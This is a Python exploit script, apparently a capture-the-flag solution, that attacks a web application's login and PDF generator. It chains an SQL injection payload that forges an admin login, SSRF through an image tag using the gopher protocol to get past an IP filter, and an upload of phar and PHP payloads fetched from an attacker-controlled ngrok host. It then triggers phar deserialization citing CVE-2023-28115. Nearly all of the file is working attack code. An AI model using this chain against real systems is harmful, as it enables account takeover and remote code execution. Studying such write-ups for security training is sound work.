from typing import Literal
import requests
from urllib.parse import quote, urljoin
import os

URL = os.environ["URL"]
NGROK = os.environ["NGROK"]


class API:
    OPT = Literal['generateFromHtml', 'getOutputFromHtml']

    def __init__(self, url=URL) -> None:
        self.url = url
        self.s = requests.Session()

    def path(self, path):
        return urljoin(self.url, path)

    def login(self, username, password, inject):
        return self.s.post(self.path("/login"), data={
            "username": username,
            "password": password,
            inject: ""
        })

    def pdf_maker(self, html, option: OPT):
        return self.s.post(self.path("/pdf-maker"), data={
            "body": html,
            "option": option,
        })

    def __make_raw_post_request(self, path, **kwargs):
        "make raw post request"
        req = requests.Request("POST", self.path(path), **kwargs)
        prep = self.s.prepare_request(req)
        res = '{}\r\n{}\r\n{}\r\n\r\n{}'.format(
            prep.method + ' ' + prep.path_url + ' ' + 'HTTP/1.1',
            'Host: localhost',
            '\r\n'.join('{}: {}'.format(k, v)
                        for k, v in prep.headers.items()),
            prep.body,
        )
        return res

    def __make_ssrf_request(self, path, **kwargs):
        r"""
        exploiting ssrf on the Knp\Snappy\Pdf using img tag
        and trigger bot to make request using gopher protocol
        to bypass the ip WAF
        """
        payload = self.__make_raw_post_request(path, **kwargs)
        payload = quote(quote(payload))
        payload = '<img src="http://localhost:5000/curl?url={g}'+f'opher://localhost:80/_{payload}">'
        return self.pdf_maker(payload, 'getOutputFromHtml')

    def trigger_deser(self, pharfile):
        r"trigger deserialization on Knp\Snappy\Pdf CVE-2023-28115"
        pharurl = "phar://"+pharfile
        payload = f"<h1>{pharurl}</h1>"
        return self.__make_ssrf_request(self.path("/pdf-maker"), data={
            "body": payload,
            "option": "generateFromHtml"
        })

    def file_upload(self, filename, location):
        "file upload using ftp protocol on bot"
        ftp = urljoin(NGROK, filename)
        payload = f'<img src="http://localhost:5000/ftp?url={ftp}&filename={quote(location)}">'
        return self.pdf_maker(payload, 'getOutputFromHtml')


if __name__ == "__main__":
    api = API()

    """
    Exploiting the sqlinjection on
    $user = $this->model->where($data)->first();
    in backend/app/Controllers/AuthController.php
    to get role admin
    """
    res = api.login(
        username="foo",
        password="foo",
        inject="password='foo'/**/UNION/**/SELECT/**/1,'admin','$2y$10$1tAju3TkMVHYkKWUKYAWfubcYWoWFSdATI44WZ68RnTc0MjYz4CeO','email','admin'#--/**/-"
    )
    serenity_session = res.cookies['serenity_session']

    print("body:", res.request.body)
    print("response:", res.text)
    print("serenity_session:", serenity_session)

    res = api.file_upload("payload.phar", "/tmp/payload.phar")
    res = api.file_upload("pwn.php", "/tmp/pwn.php")
    if not res.ok:
        print(res.text)
        exit(1)
    res = api.trigger_deser("/tmp/payload.phar")
    print(res.text)
